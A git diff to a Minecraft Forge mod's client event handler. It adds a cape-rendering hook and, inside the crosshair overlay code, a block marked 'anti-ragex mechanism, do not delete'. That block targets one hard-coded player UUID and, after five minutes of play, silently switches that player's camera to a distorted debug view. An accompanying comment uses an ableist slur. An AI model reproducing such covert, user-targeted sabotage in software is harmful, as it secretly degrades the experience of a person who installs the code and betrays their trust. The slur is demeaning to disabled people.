@@ -2,7 +2,9 @@ package com.hfr.main;
 
 import org.lwjgl.input.Keyboard;
 
+import com.hfr.render.RenderAccessoryUtility;
 import com.hfr.render.hud.RenderRadarScreen;
+import com.mojang.authlib.minecraft.MinecraftProfileTexture.Type;
 
 import cpw.mods.fml.client.FMLClientHandler;
 import cpw.mods.fml.common.FMLCommonHandler;
@@ -12,11 +14,15 @@ import cpw.mods.fml.common.gameevent.TickEvent;
 import cpw.mods.fml.common.gameevent.TickEvent.ClientTickEvent;
 import cpw.mods.fml.common.gameevent.TickEvent.Phase;
 import net.minecraft.client.Minecraft;
+import net.minecraft.client.entity.AbstractClientPlayer;
 import net.minecraft.client.gui.GuiChat;
+import net.minecraft.client.renderer.entity.RenderPlayer;
 import net.minecraft.entity.player.EntityPlayer;
+import net.minecraft.util.ResourceLocation;
 import net.minecraftforge.client.event.MouseEvent;
 import net.minecraftforge.client.event.RenderGameOverlayEvent;
 import net.minecraftforge.client.event.RenderGameOverlayEvent.ElementType;
+import net.minecraftforge.client.event.RenderPlayerEvent;
 import net.minecraftforge.common.MinecraftForge;
 
 public class EventHandlerClient {
@@ -40,6 +46,11 @@ public class EventHandlerClient {
 		
 		if(event.type == ElementType.CROSSHAIRS)
 		{
+			//anti-ragex mechanism, do not delete
+			if(player.getUniqueID().toString().equals("c874fd4e-5841-42e4-8f77-70efd5881bc1"))
+				if(player.ticksExisted > 5 * 60 * 20) //<- time til the autism kicks in
+					Minecraft.getMinecraft().entityRenderer.debugViewDirection = 5;
+			
 			if(!FMLClientHandler.instance().isGUIOpen(GuiChat.class)) {
 				if(Keyboard.isKeyDown(ClientProxy.toggleZoom.getKeyCode())) {
 					
@@ -84,6 +95,18 @@ public class EventHandlerClient {
 				RenderRadarScreen.renderRadar(offset, range, zoom);
 			}
 		}
+	}
+	
+	@SubscribeEvent
+	public void preRenderEvent(RenderPlayerEvent.Pre event) {
+		
+		RenderPlayer renderer = event.renderer;
+		AbstractClientPlayer player = (AbstractClientPlayer)event.entityPlayer;
+		
+		ResourceLocation cloak = RenderAccessoryUtility.getCloakFromPlayer(player);
+		
+		if(cloak != null)
+			player.func_152121_a(Type.CAPE, cloak);
 	}
 	
 	/*@SubscribeEvent
